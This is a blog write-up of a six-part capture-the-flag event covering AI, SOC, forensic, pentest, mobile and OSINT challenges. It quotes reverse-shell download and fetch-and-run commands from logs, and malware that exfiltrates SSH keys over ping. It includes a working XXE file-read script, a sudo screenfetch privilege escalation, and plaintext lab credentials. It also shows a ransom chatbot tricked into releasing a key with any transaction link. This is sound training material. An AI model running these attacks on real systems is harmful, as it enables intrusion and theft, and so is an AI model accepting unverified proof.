---
title: DGSE 25 Writeup
feed: show
permalink: /dgse25
date: 10-02-2025
summary: Wargames
---

Again a CtF for a military agency... I am a pacifist, It's just that I like Root-Me and they organize the event!

Here we have 6 challenges on diverse categories with the common thread of a threat actor:  the Nullvastation group.

![[DGSE25_intro.png| a wide variety of challenges]]


### 1:  AI

An AI challenge that looked promising but left me a bit dubious.
You have a web platform with leaked data, and you can download samples of these leaks. The files are encrypted and you need to pay 3 BTC to get the decryption key. However, the verification process is done trough an AI chatbot.

![[DGSE25_AI.png| The ransom platform with an AI chatbot]]  

The chatbot tells us we can prove the transaction by "sending a link to a reputed bitcoin tracking site with the transaction proof"

Trying to get more info on this verification process, bypassing the prompt or redirecting to my own website did not work.

However, I just had to give a link to *any* transaction on `blockchain.com` ... and the bot validates it!
  
```

link for the transaction: https://www.blockchain.com/explorer/transactions/btc/8e10f89f59b69fa73cf252a474ef199ffbab4ce1129f5a5b668438a21291d7d0

  

    Your transaction has been verified. Here is the decryption key: cf0fe99934cbc10c7e55bada9870bda1691a4a27. Remember, this is a one-time opportunity...

```

  the flag is in `Medicine_Recipes.pdf`
### 2:  SOC

  
131 / 5 000

We have access to an Opensearch SOC platform and we must find in the systemd and apache logs the proofs and method of an attack, namely:

- the CWE of the first vulnerability exploited 
- the CWE of the second vulnerability
- the IP address of the server where the attacker placed their tools
- the path to the attacker's persistence file


  ![[DGSE25_soc.png|a view of the Opensearch SOC platform ]]

As by default results are ordered by most recent, I took a "reverse" approach that worked pretty well.
Starting by checking the logs on the system was simpler as the web Apache logs contained attack attempts from different IP addresses, while only the successful attacker connected to the system and left logs on it.


In the logs systemd we will focus on the most interesting field `cmdline`.
we use the filters:
- cmdline:exists
- NOT cmdline:sshd

We get a bunch of commands, the attacker base64 encoding them, but they are decoded in the logs. 
Inside, we have the persistence file and the IP address of the tools server.
  
```
/bin/bash /root/.0x00/pwn3d-by-nullv4stati0n.sh
...
wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh

sh -c echo 'd2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64 -d|sh
```

  We can now search for one of these very specific base64 strings in the Apache logs. 
  We choose the `clientip` and `request` fields and find:


```
10.143.17.101 /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'==d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA===='|base64+-d|sh
```

By filtering on the attacker's IP address, we can unfold his attack.

```
/admin-page/manage.php?success=true&path=upload/90e2f72c1049efbec5ffb6e152415986/hackerman.jpg
...
/admin-page/manage.php
...
/?lang=php://filter/read=convert.base64-encode&page=resource=db/connect
```

  

First, we have an LFI with PHP filters, so [CWE-98](https://cwe.mitre.org/data/definitions/98.html): Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') 

Then a jpg file upload that is actually a PHP file allowing command execution via a request parameter, so [CWE-434](https://cwe.mitre.org/data/definitions/434.html): Unrestricted Upload of File with Dangerous Type

thus the flag is: 

```

RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}

```

### 3:  Forensic

Someone downloaded a tool from an untrusted source, and got infested by a Nullvastation malware.
We need to investigate how the attack unfolded, by checking a VM of the infected device and the network logs via a PCAP file.
 

The PCAP logs lot of encrypted traffic, but if we search for "http" unencrypted requests, we get only one result, for a file `ntpdate.sh` 
A tool to automatically update system time, but checking its content, we see some dubious behavior.
Chosen bytes:

```bash

__DST="${__TMPF[$RANDOM % ${#__TMPF[@]}]}"

...

echo "@reboot root PYTHONPATH=${__PYLIB} python3.7 ${__DST}/.sys &" > /etc/cron.d/.ntpdate_sync
```

  Among other things, the script mimics `ntpdate` behavior, downloads another compiled python malware stage  and creates a cron job executing it. 

The path of the python malware contains a random part, but as we have the VM of the infected device, we can recover the cron job definition.

```bash
cat /etc/cron.d/.ntpdate_sync
    @reboot root PYTHONPATH=/home/johndoe/.local/lib/python3.7/site-packages python3.7 /opt/fJQsJUNS/.sys &

file /opt/fJQsJUNS/.sys

    /opt/fJQsJUNS/.sys: Byte-compiled Python module for CPython 3.7,

```

  
we decompile the python malware
```bash
pip3 install uncompyle6
cp /opt/fJQsJUNS/.sys d.pyc
uncompyle6 d.pyc > malware.py
```

  
The malware is a bit obfuscated an does a lot of things, including checks to see if it's in a VM of in antivirus runs. 
But most importantly, it encrypts files, in small 16-byte chunks, and exfiltrates them via ping.
this includes a `/root/.secret` file that is deleted afterwards.
But we still have the PCAP logs!

Chosen bytes:

```python
import os, subprocess, psutil, base64
from Crypto.Cipher import AES
KEY = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
IV = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
__d = "37e0f8f92c71f1c3f047f43c13725ef1"
...
def __exf(path, dst, size=15):
	...
	d = open(path, "rb").read()
    segs = [d[i[:i + size]] for i in range(0, len(d), size)]
    for seg in segs:
        try:
            payload = AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(seg)).hex()
            #payload was base64 encrypted
            cmd = ["ping", "-c", "1", "-p", payload, dst] 
            subprocess.run(cmd, ...)
            ...

...
        __kll = [
         "/root/.secret",
         os.path.expanduser("~/.ssh/id_rsa"),
         "/root/.ssh/id_rsa"]
        for f in __kll:
            if os.path.exists(f):
                __exf(f, __x(__d))
		# delete "/root/.secret"

```


I already did a challenge on the same principle (probably created by the same person) and made a [writeup](https://tuxlu.fr/RootXMAS_2024_02).

So I just had to write the AES decryption part to my script, and it's flagged.
You can find [my decryption script at the bottom of this article](#inspectpcappy) .
  
```bash
./service_3/inspectPcap.py
    RM{..}
    -----BEGIN OPENSSH PRIVATE KEY-----
    ...
```

### 4: pentest

We found a tools server used by Nullvastation now is time for payback!

It's a web interface for Word document tracking with two endpoints: 
- upload a Word document to create a copy with an ID hidden inside
- upload a Word doc to extract an ID if present. 

![[DGSE25_documenttracker.png| the document tracker page]]

We create an empty Docx, upload it, and then extract and inspect it. A Docx is only a Zip with XML files after all.
We see a `VictimID` field added in the `docProps/app.xml` file.

XML means... XXE? let's find out!
We add an Entity trying to access a known linux file, and call it in the `VictimID` field.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
...
<VictimID>&xxe;</VictimID>
...
```

We rezip the docx   (only `docProps/app.xml` is necessary), we upload and are answered:

```
{'victimid': '
root:x:0:0:root:...
...
document-user:x:999:996::/home/document-user:...
executor:x:996:995::/home/executor:...
administrator:x:995:994::/home/administrator...
'}
```
``
we can create a script to automate file search on the server, as we have discovered 3 interesting users with `/etc/passwd`  
You can find the [XXE script at the bottom of the article](#xxefilesearchpy)


we find `/app/app.py`, the source code of the server, 

but most importantly,  `/document-user/.bash_history` that contains:
```bash
echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
```

An nmap on the machine reveals that SSH is available on port 22222, so we can try connecting with different users. It works with `executor`.

```bash
ssh executor@163.172.67.183 -p 22222
    executor@document-station:~$
```
##### privesc

  We can sudo as administrator to run `screenfetch`, a tool for displaying system information. 
  The tool's help indicates that the `-a` option allows us to specify a bash file to run. Privesc as a feature! 
  We can create a shell and we see that in the administrator's home page there's a `vault.kdbx` file that looks juicy. We'll just exfiltrate it with SCP. There's a `logo.jpg` file, so we'll get it too. 
  We find a writable folder, write our script in it, and run it.

the commands we run: 
```bash
sudo -l
	# no env or path changes possible
    Matching Defaults entries for executor on document-station:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

    User executor may run the following commands on document-station:
        (administrator) NOPASSWD: /usr/bin/screenfetch

sudo -u administrator /usr/bin/screenfetch
    # nice ascii art and system infos
    administrator@document-station

screenfetch -h
    ...
     -a 'PATH'  You can specify a custom ASCII art by passing the path
    to a Bash script, defining `startline` and `fulloutput`
    variables

# search a writable folder as /tmp is not available
find / -writable -type d 2>/dev/null
    ...
    /dev/shm

ls -la /home/administrator/
    lrwxrwxrwx      .bash_history -> /dev/null
    -rw-r-----      logo.jpg
    -rw-r-----      vault.kdbx

echo "cp /home/administrator/vault.kdbx /dev/shm/vaultzzcc.kdbx; chmod 777 /dev/shm/vaultzzcc.kdbx;" > /dev/shm/testzzcc.sh

sudo -u administrator /usr/bin/screenfetch -a /dev/shm/testzzcc.sh

# same with logo.jpg
echo "cp /home/administrator/logo.jpg /dev/shm/logozzcc.jpg; chmod 777 /dev/shm/logozzcc.jpg;" > /dev/shm/testzzcc.sh

sudo -u administrator /usr/bin/screenfetch -a /dev/shm/testzzcc.sh  b
```

and back on the attack machine :
```bash
scp -P 22222 executor@163.172.67.183:/dev/shm/vaultzzcc.kdbx ./
scp -P 22222 executor@163.172.67.183:/dev/shm/logozzcc.kdbx ./

```

We have a kdbx file but not the password. 
`keepass2john` doesn't work because the Keepass version is too recent.
  
We test [keepass4brute](https://github.com/r3nt0n/keepass4brute) which manually tests each password with the Keepass CLI, but it's long and doesn't yield any results... 
   
If we go back to the innocent looking image and run an exiftool we get the line `VullVastation secret`...   
Wait, with Keepass we can have a "key file" , what if it was this image?

```bash
keepass2john vault.kdbx > keepass.hash
    ! vault.kdbx : File version '40000' is currently not supported!

./keepass4brute.sh vault.kdbx $wl
    # very slow bruteforce

exiftool logozzcc.jpg
    ...
    Artist : VullVastation secret
  
keepassxc --keyfile logozzcc.jpg vault.kdbx
	# opens keepass with flag
    RM{...}
```

We are greeted with a keepass containing creds and the flag.

![[DGSE25_keepass.png| a keepass full of creds and lore]]

### 5 : Mobile

An APK with encrypted messaging... but with a pretty unsecure key!

![[DGSE25_mobile.png|A nice mobile app. But we are not here for fancy GUIs]]

We have an APK, so let's try full static. You can use `apktools` and even some [online websites](https://www.decompiler.com/jar) that do the process for you. (it's bad... but quick!)

We find the app code in `sources/com/nullvastation/cryssage`
  
In the `API` folder we find a juicy HTTP endpoint, `163.172.67.201:8000/messages?id=VALUE` 

```java
// /api/ApiService.java
public interface ApiService {
    @GET("messages")
    @Headers({"Accept: application/json"})

    Object getMessages(@Query("id") String str, Continuation<? super Response<ApiResponse>> continuation);
}

// /api/RetrofitClient.java
...
private static final String BASE_URL = "http://163.172.67.201:8000/";
...
```

 By checking this URL, we can recover a JSON list of encrypted messages.

```
    "messages": [
        {
            "content": "M2geCVKO...=",
            "isEncrypted": true,
            "sender": "Agent-02",
            "timestamp": "2025-04-01 08:00:00"
        },
        {
            "content": "//5PBsYWhHlgqh...==",
```

By climbing back the function call tree and searching interesting methods, we find a method `isEncrypted`, and by searching `*decrypt*` , we get the  `decryptMessage` method in `/ui/home/HomeViewModel.java`

It's Kotlin "compiled" to Java, so verbose, but the encryption process boils down to this simplified pseudocode: 

```python
from hashlib import sha256
from base64 import b64encode, b64decode

model = "???" # Build.MODEL;
brand = "???" # Build.BRAND;

#defined above in file
STATIC_SALT = "s3cr3t_s@lt"
STATIC_IV = "LJo+0sanl6E3cvCHCRwyIg=="

message_st = ""
message : bytes = b64decode(message_st)

hashDeviceID = b64encode(sha256(str(model + ':' + brand).encode("utf-8")).digest()).decode("utf-8")
key = sha256(str(hashDeviceID + ':' + STATIC_SALT).encode("utf-8")).digest()
```

So messages are encrypted in AES with the key containing  the `Build.MODEL` and  `Build.BRAND` of the sender's device.

> [!error] warning!
> It is unclear how such app would realistically work, as encryption is done vias AES which is symmetric , preventing End-to-End encryption. The message sending method not being implemented on the app, we can only assume an app user Alice sends the message in plain text to the server and when user Bob requests messages, the server encrypts Alice messages with Bob key.
> 
> Still it's a strange behavior, complexified by the fact that chall makers created a weird case, where the `id` parameter of the API call made the 3 last messages of the list encrypted with this ID, while all other stayed unaffected.
> 
> This allowed players to have the app show 3 decrypted messages with whatever Android device  they were using.
> 
> This challenge behavior was pretty obscure and unrealistic. 
> It could confuse a player, like for example someone who makes a simple mistake on his decryption script by inverting two parameters, and instead of noticing it spends 4 hours in a rabbit hole trying to understand how the app works. Hypothetical scenario of course.

`Build.MODEL` and  `Build.BRAND` are two variables shared across every device of the same model.

These variables values are publicly known, as Google provides a [CSV with all Android device supporting Google Play](https://storage.googleapis.com/play_public/supported_devices.html)

```
Retail Branding,Marketing Name,Device,Model
"MODEL","","AD681H","BRAND"
"","","AD681H","Smartfren Andromax AD681H"
...
"Google","Pixel 9a","tegu","Pixel 9a"
...
"zyrex","zyrex","ZT216_7","ZT216_7"
```

Had our attacker used a Kindle Fire tablet, finding these values would have been harder, but the chall introduction tells us the attacker used "an old Google tablet". Vague description, but with this we filter the 47000 entries in the CSV to about 100 with a simple `grep` command:

```bash
 grep '"Google"' supported_devices.csv > google_devices.txt
```

We just have to create an AES key for each model value and bruteforce our decryption with  [a bruteforce script you can find below](#decryptphonemessagespy).

```bash
python service_5/decryptMessages.py

    Target acquired. Hospital network vulnerable. Initiating ransomware deployment.

    Keep this safe. RM{...} 

    New target identified. School district network. Estimated payout: 500k in crypto.

    ready for deployment. Testing phase complete.

    Security patch released. Need to modify attack vector. Meeting at usual place.

    New zero-day exploit in a linux binary discovered. Perfect for next operation. Details incoming.

Model: Yellowstone Google
```

  It's a [strange prototype tablet](https://wiki.oddsolutions.us/devices/yellowstone/), so at least the user had few chances that another user could accidentally decrypt his messages on this wonky app by owning the same device model .

### 6:  OSINT

The chall introduction tells us that clues were hidden in the previous challenges. We had to pay attention! 

The Keepass from the pentest challenge contained lots of interesting things, like credentials for an SSH... but it tells us in a comment that the IP address changes regularly, and that it can be found in a previous operation. 

In the SOC challenge, we also remember finding an IP address from which an attacker retrieved his tools. Upon testing, we realized that this IP address was indeed still up. Let's put our clues together.
  
```bash
ssh operator@163.172.67.201
LGSA5l1%YHngd&GbjxR4Or

    operator@attacker:~$ ls
        tools
```

The machine does indeed contain the tools used in the challenges, including [onlymacro.py](osint/tools_attackserver/onlymacro/onlymacro.py) that contains an author name, `voidsyn42`. 
A Google search does not return anything,  but a duckduckgo one finds a  [Github account](https://github.com/voidsyn42/voidsyn42)! The Github has 3 repos, but they don't contain anything new. Still, Git means commits, so let's clone a random repo:
  
```bash
git clone https://github.com/voidsyn42/onlymacro
cd onlymacro
git log
    Author: voidsyn42 <syn.pl42@proton.me>
```

> [!error] warning!
>I tried using the [gitrecon](https://github.com/GONZOsint/gitrecon) project, but it didn't fetch information from the commits as I expected.

The attacker left his email address in his commit logs! 

A search on the OSINT platform [epieos](https://epieos.com/?r=1) , or by directly using GHunt, we find a link between this email and a [Google Maps review ](https://maps.app.goo.gl/u9e19ns2rZQSogiF8) of the Eiffel Tower by a user named Pierre Lapresse.
We only needed to retrieve his name, so it's the final flag.

![[DGSE25_osint.png|What a tourist]]

  > [!info] note
>in the apkobfuscator project, we find [a .pyc file](https://github.com/voidsyn42/apkfuscator/blob/main/utils/__pycache__/junk_generator.cpython-313.pyc), although normally blocked by the `.gitignore`. We find a path to the machine of the creator of the challenge, we may have gone outside the scope...
>


```bash
strings osint/tools_attackserver/apkfuscator/utils/__pycache__/junk_generator.cpython-313.pyc

	Z/DATA/RMP/Gitlab/Events/ev-em-def/chall/etape_6/exegol/apkfuscator/utils/junk_generator.py
	generate_junk_coder
```

### inspectPcap.py

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
from scapy.all import sniff
from scapy.layers.inet import IP, ICMP

KEY = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
IV = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
final_res = ""


def unpad(s):
        return s[:-ord(s[len(s)-1:])]


def process_packet(packet):
    global final_res

    if packet.haslayer(ICMP) and packet[IP].src == "192.168.1.5":
        icmp_payload = packet[ICMP].payload.load
        try:
            payload = icmp_payload[16:16+16]
            padded = AES.new(KEY, AES.MODE_CBC, IV).decrypt(payload)
            res = unpad(padded).decode('utf-8')
            final_res += res;
        except Exception as e:
            print(f"An error occurred while decoding: {e}")

# Sniff ICMP packets coming from the IP address "10.0.2.15"
sniff(offline='service_3/capture_victim.pcap', filter="icmp", prn=process_packet, store=0)
print(final_res)
```

go back to [2: SOC](#2-soc)

### XXEFilesearch.py

```python
import xml.etree.ElementTree as ET
import requests
import zipfile


xml_fname = "pentest/signed/docProps/app.xml"
zip_fname = "pentest/pentest.docx"

original_xml = ""
with open("pentest/app.xml", "r") as f:
    original_xml = f.read()

def create_zip(original_xml, header, nfield):
    rep = original_xml.replace("HEADER", header)
    rep = rep.replace("VIDREPLACE", nfield)
    with open(xml_fname, "w") as f:
        f.write(rep)

    with zipfile.ZipFile(zip_fname, 'w') as zf:
        zf.write("pentest/signed/docProps/app.xml", "docProps/app.xml")


def attack(original_xml, fname):
    protocol = "file://"
    header = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + protocol + fname + '"> ]>'

    create_zip(original_xml, header, "&xxe;")
    with open(zip_fname,'rb') as zf:
        res = requests.post("http://163.172.67.183/read", files={'file': zf})
        if (res.status_code == 500):
            print(fname, "500")
        else:
            j = res.json()
            e = j.get("error")
            if e:
                print(fname, e)
            else:
                print(fname, j["victim_id"].replace("\n", "\r\n").encode("utf-8"))

users = [ "/root",
"/home/document-user",
#"/app",
#"/var/www",
#"/var/backups",
#"/home/executor",
#"/home/administrator"
]

# intersting: /app/app.py /etc/passwd /etc/hosts
with open('pentest/wl_all.txt', 'r') as f:
    for l in f.readlines():
        attack(original_xml, l.strip())

# intersting: /home/document-user/.bash_history
for user in users:
    with open('pentest/wl_users.txt', 'r') as f:
        for l in f.readlines():
            attack(original_xml, user + "/" + l.strip())
```

go back to [4: pentest](#4-pentest)


### decryptPhoneMessages.py

```python
from hashlib import sha256
from base64 import b64encode, b64decode
from Crypto.Cipher import AES;
import json
import csv

def main():
    j = None
    with open("service_5/messages.json", "r") as json_file:
        j = json.load(json_file)

    messages = j["messages"][:-3]

    fname = "service_5/supported_devices.csv"
    fname = "service_5/google_devices.csv"

    with open(fname, "r", encoding='utf-16') as csv_models_file:
        csv_reader = csv.reader(csv_models_file, delimiter=',')
        found = False
        for row in csv_reader:
            brand = row[0]
            model = row[3]

            for i in range(len(messages)):
                n = decrypt(messages[i]["content"], model, brand)
                if n:
	                found = True
                    print(n)
            if found:
	            print("Model", model, brand)


def create_hashdeviceID(model, brand):
    return b64encode(sha256(str(model + ':' + brand).encode("utf-8")).digest()).decode("utf-8").replace('\n','')

def decrypt(message, model, brand):
    #defined above in file
    STATIC_SALT = "s3cr3t_s@lt"
    STATIC_IV = "LJo+0sanl6E3cvCHCRwyIg=="

    hashDeviceID = create_hashdeviceID(model, brand)
    key = sha256(str(hashDeviceID + ':' + STATIC_SALT).encode("utf-8")).digest()
    cipher = AES.new(key=key, mode=AES.MODE_CBC, IV=b64decode(STATIC_IV))
    try:
        ciphertext = cipher.decrypt(b64decode(message))
        res = ciphertext.decode("ascii")
    except Exception as e:
        return None
    return res

main()

```

go back to [5: mobile](#5--mobile)